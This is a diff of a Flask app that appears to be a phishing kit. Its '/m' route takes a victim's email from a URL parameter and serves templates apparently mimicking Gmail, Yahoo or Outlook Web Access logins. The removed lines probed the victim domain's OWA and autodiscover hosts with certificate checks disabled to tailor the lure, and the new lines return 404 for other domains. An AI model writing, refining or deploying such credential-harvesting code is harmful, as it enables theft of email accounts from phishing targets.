@@ -170,41 +170,22 @@ def success():
         return redirect(url_for('captcha'))
 
 
-@app.route("/m", methods=['GET', 'POST'])
+@app.route("/m")
 def route2():
-web_param = request.args.get('web')
+    web_param = request.args.get('web')
+    
     if web_param:
-	web_param = request.args.get('web')
         session['eman'] = web_param
-        session['ins'] = web_param.split('@')[-1]  # Extract domain
-        domans = web_param.split('@')[-1]
-        app.logger.info(f"Extracted domain: {session['ins']}")  # Flask logging
+        domain = web_param.split('@')[-1]  # Extract domain
+        session['ins'] = domain
 
-        # Direct mappings for known email domains
-        if domans == "gmail.com":
+        if domain == "gmail.com":
             return render_template('gowa.html', eman=session.get('eman'), ins=session.get('ins'))
-        elif domans == "yahoo.com":
+        elif domain == "yahoo.com":
             return render_template('Yahoo.html', eman=session.get('eman'), ins=session.get('ins'))
-
-        # Construct OWA URLs
-        owa_url = urljoin(f"https://owa.{domans}", "/owa/#path=/mail")
-        autodiscover_url = urljoin(f"https://autodiscover.{domans}", "/owa/#path=/mail/search")
-
-        # Try accessing OWA URLs
-        for url in [owa_url, autodiscover_url]:
-            try:
-                response = requests.get(url, verify=False, timeout=3)
-                if response.status_code == 200:
-                    app.logger.info(f"Accessible URL found: {url}")
-                    return render_template("gowa.html", eman=session.get('eman'), ins=session.get('ins'), owa_url=url)
-            except requests.exceptions.RequestException:
-                app.logger.warning(f"URL not accessible: {url}")
-
-        # If no valid OWA URL, fallback to general gowa.html
-        return render_template("gowa.html", eman=session.get('eman'), ins=session.get('ins'))
-
-    # If no valid web_param, redirect to index.html
-    return render_template("index.html", eman=session.get('eman'), ins=session.get('ins'))
+    
+    # If the domain is not Gmail or Yahoo, return a 404 error
+    abort(404)
 
 @app.route("/first", methods=['POST'])
 def first():
